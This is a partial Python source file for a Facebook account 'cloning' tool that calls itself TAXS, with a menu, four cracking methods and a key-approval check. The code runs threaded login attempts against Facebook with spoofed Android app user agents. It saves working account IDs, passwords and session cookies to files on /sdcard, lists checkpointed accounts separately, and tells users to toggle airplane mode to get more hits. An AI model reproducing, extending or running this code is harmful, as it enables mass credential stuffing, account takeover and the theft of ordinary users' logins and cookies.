...
os.system('clear')
print('         \x1b[38;5;46m WELCOME TO CRACKING WORLD          ')
...
def menu():   
    os.system('clear')
    print(logo)
    print(f'\x1b[38;5;196m[\x1b[1;97m1\x1b[38;5;196m] \033[38;5;46mFile Cloning')
    print(f'\x1b[38;5;196m[\x1b[1;97m2\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mRandom Cloning ')
    print(f'\x1b[38;5;196m[\x1b[1;97m3\x1b[38;5;196m]\033[38;5;46m \033[38;5;46mCreate File')
...
def method_crack():
    ...
    print(f'\x1b[38;5;196m[\033[38;5;46m3\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;97m●\033[38;5;46m API')
    print(f'\x1b[38;5;196m[\033[38;5;46m4\x1b[38;5;196m] \033[38;5;46mMethod \x1b[1;97m●\033[38;5;46m B-api')
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}\x1b[38;5;196m[\033[38;5;46mTAXS\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] {loop}  \x1b[38;5;196m[\033[38;5;46mM1\x1b[38;5;196m] \033[38;5;46mOK\x1b[1;97m/\x1b[38;5;196mCP [\x1b[1;92m{len(oks)}\x1b\x1b[38;5;196m[\033[38;5;46m0 \x1b[1;97m● \x1b[1;96m{len(cps)}\x1b\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \x1b[1;97m| {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            ...
            uaxx = f'[FBAN/FB4A;FBAV/'+str(random.randint(11,99))+'.0.0.'+str(random.randint(1111,9999))+';FBBV/'+str(random.randint(1111111,9999999))+';[FBAN/FB4A;FBAV/60.0.0.16.76;FBBV/20453986;FBDM/{density=1.5,width=480,height=800};FBLC/es_LA;FBCR/ENTEL;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J110L;FBSV/4.4.4;nullFBCA/armeabi-v7a:armeabi;]'
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
            except:
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} \x1b[38;5;196m[\033[38;5;46mTAXS\x1b[38;5;196m] \x1b[38;5;46m{sid} \x1b[1;97m●\x1b[38;5;46m {ps} {S}\n=#={ckkk}")
                    
                    Elite(sid,ps,ckkk)
                    oks.append(sid)                 
                    open('/sdcard/TAXS/OK_ids_M1.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TAXS/COOKiEs_M1.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                     #print(f"\r\x1b[1;96m [TAXS-CP] {sid} ● {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/TAXS/M1-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}\x1b[38;5;196m[\033[38;5;46mTAXS\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] {loop}  \x1b[38;5;196m[\033[38;5;46mM3\x1b[38;5;196m] \033[38;5;46mOK\x1b[1;97m/\x1b[38;5;196mCP [\x1b[1;92m{len(oks)}\x1b\x1b[38;5;196m[\033[38;5;46m0 \x1b[1;97m● \x1b[1;96m{len(cps)}\x1b\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \x1b[1;97m| {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TAXS/OK_ids_M3.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/TAXS/COOKiEs_M3.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                   # print(f"\r\x1b[1;96m [TAXS-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/TAXS/M3-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}\x1b[38;5;196m[\033[38;5;46mTAXS\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] {loop}  \x1b[38;5;196m[\033[38;5;46mM2\x1b[38;5;196m] \033[38;5;46mOK\x1b[1;97m/\x1b[38;5;196mCP [\x1b[1;92m{len(oks)}\x1b\x1b[38;5;196m[\033[38;5;46m0 \x1b[1;97m● \x1b[1;96m{len(cps)}\x1b\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \x1b[1;97m| {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard//TAXS/OK_ids_M2.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TAXS/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #print(f"\r\x1b[1;96m [TAXS-CP] {sid} ● {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/TAXS/M2-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def methodD(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}\x1b[38;5;196m[\033[38;5;46mTAXS\x1b[1;97m-\033[38;5;46mXD\x1b[38;5;196m] {loop}  \x1b[38;5;196m[\033[38;5;46mM4\x1b[38;5;196m] \033[38;5;46mOK\x1b[1;97m/\x1b[38;5;196mCP [\x1b[1;92m{len(oks)}\x1b\x1b[38;5;196m[\033[38;5;46m0 \x1b[1;97m● \x1b[1;96m{len(cps)}\x1b\x1b[38;5;196m[\033[38;5;46m0\x1b[38;5;196m] \x1b[1;97m| {S}{''.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            android_version = f"Android {random.randint(4, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
            facebook_version = f'{random.randint(10,432)}.0.0.{random.randint(11,99)}.{random.randint(1,200)}'
            fbbv = str(random.randint(10000000, 99999999))
...
'Content-Length': str(len(content_lenght))}
                ...
                if 'session_key' in q:
                    ...
                    Elite(sid,ps,ckkk)
                    oks.append(sid)
                    open('/sdcard/TAXS/OK_ids_M4.txt','a').write(sid+'●'+ps+'\n');open('/sdcard/TAXS/COOKiEs_M2.txt','a').write(sid+'●'+ps+'●'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                  #    print(f"\r\x1b[1;96m [Fuck] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard//TAXS/M4-CP.txt','a').write(sid+'●'+ps+'\n')
                else:
                    continue
            loop+=1
        except requests.exceptions.ConnectionError:
    ...
    def pasw(self):       
            ...
            print(f'\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')
            print("\x1b[38;5;46mUse Airplane Mode For More OK IDS")
            from datetime import datetime
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            print("\x1b[38;5;46mCloning Start Time \x1b[1;97m●\x1b[38;5;46m ", current_time)
            print("\x1b[1;97m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
            with SiamToxic(max_workers=30) as Toxicworld:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
...
def main_apv():
    ...
    print(logo)
    try:
        key1 = open('/sdcard/.TAXS.key.txt', 'r').read()
    except IOError:
        os.system('clear')
        print(logo)
        ...
        kok = open('/sdcard/.TAXS.key.txt', 'w')
        kok.write(myid + imt)
        kok.close()
    ...
    if key1 in r1:
        ...
        os.system('clear')
        print(logo)
        print('                \033[1;41m\033[1;97mWELCOME TO CRACKING WORLD\033[;0m\033[1;93m              ')
        linex()
